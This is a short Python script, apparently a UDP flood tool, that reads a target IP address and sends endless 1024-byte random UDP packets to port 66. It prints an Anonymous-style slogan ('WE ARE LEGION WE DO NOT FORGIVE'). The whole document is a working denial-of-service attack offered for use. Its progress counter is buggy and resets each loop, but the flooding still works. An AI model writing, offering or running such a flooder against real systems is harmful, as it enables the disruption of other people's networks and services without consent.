import socket
import random

s = socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
data = random._urandom(1024)
ip = input('enter the ip address: ')
print("WE ARE LEGION WE DO NOT FORGIVE")
while 1:
   sent = 0
   s.sendto(data,(ip,66))
   print('sent %s of data to %s at %s port'%(sent,ip,66))
   sent = sent+1
